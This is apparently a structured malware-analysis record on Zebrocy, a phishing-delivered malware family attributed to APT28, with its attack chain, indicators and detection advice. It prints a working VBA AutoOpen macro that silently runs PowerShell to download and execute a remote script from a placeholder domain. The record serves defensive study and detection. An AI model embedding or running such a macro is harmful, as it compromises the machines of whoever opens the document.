package_info.package_manager: N/A (malware distributed via phishing, not a package manager)
package_info.why_malicious: Zebrocy is a malware family attributed to APT28, distributed via targeted phishing campaigns. It is engineered to deliver and execute additional payloads, exfiltrate sensitive data, and provide remote access to compromised systems. The malware is typically delivered through malicious documents containing macros, which initiate a multi-stage infection chain targeting government and commercial organizations.

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objShell As Object
  Set objShell = CreateObject("WScript.Shell")
  objShell.Run "cmd.exe /c powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')"
End Sub
malicious_snippets.code_behavior: On document open, the macro uses WScript.Shell to launch a hidden PowerShell process that downloads and executes a remote script from a malicious domain, resulting in the initial payload being delivered and executed.

malice_analysis.why_suspicious: The macro automatically executes on document open and launches a hidden PowerShell process to download and run code from an external, untrusted domain, which is a well-known malware delivery technique.
malice_analysis.violated_expectations: Legitimate documents should not contain macros that execute system commands or download and run code from the internet without explicit user consent.
malice_analysis.similar_legitimate_use: Some enterprise automation may use macros to run internal scripts, but never to download and execute code from untrusted or external sources.
key_indicators: AutoOpen macro triggers code execution upon document open
Use of WScript.Shell to invoke cmd.exe and PowerShell
PowerShell command downloads and executes remote script from non-corporate domain

malicious_snippets.code_behavior: After the initial payload is executed, the script downloads a second-stage executable from a remote domain to the TEMP directory and launches it, enabling further compromise and persistence on the system.

malice_analysis.why_suspicious: The script downloads an executable from an external domain and immediately executes it, which is a hallmark of multi-stage malware delivery and is rarely seen in legitimate automation.
malice_analysis.violated_expectations: Legitimate scripts should not fetch and execute untrusted binaries from the internet without user awareness and proper validation.
malice_analysis.similar_legitimate_use: Software updaters may download signed updates from trusted domains, but not arbitrary executables from unknown or suspicious sources.
key_indicators: Invoke-WebRequest used to download executable from external domain
Writes executable to user TEMP directory
Starts process of newly downloaded file without user interaction

attack_chain.action: User opens a phishing document, triggering the embedded malicious macro.
attack_chain.leads_to: Initial download and execution of the first-stage payload

attack_chain.action: Macro launches a hidden PowerShell process to download and execute the first-stage payload script.
attack_chain.leads_to: Execution of the first-stage PowerShell payload

attack_chain.action: First-stage PowerShell payload downloads and executes a second-stage executable from a remote domain.
attack_chain.leads_to: Full system compromise, data exfiltration, or deployment of additional malware

behavioral_signatures: Office documents containing AutoOpen macros that invoke PowerShell or cmd.exe
PowerShell scripts that download and execute remote code from non-corporate domains
Process tree showing Office application spawning cmd.exe and then powershell.exe
file_indicators: Executable files such as second_stage.exe written to %TEMP% directory
Downloaded scripts or executables from domains not associated with the organization
network_indicators: HTTP/HTTPS requests to known Zebrocy command-and-control (C2) domains
Outbound connections from Office or PowerShell processes to untrusted or suspicious IP addresses
detection_knowledge.how_to_detect: Monitor for Office documents with macros that launch PowerShell or cmd.exe, especially those that download code from the internet. Alert on PowerShell processes spawned by Office applications, and on network connections to suspicious or known Zebrocy C2 domains from user endpoints. Use endpoint protection to block or sandbox documents exhibiting suspicious macro behavior, and scan for executables written to user TEMP directories by PowerShell.
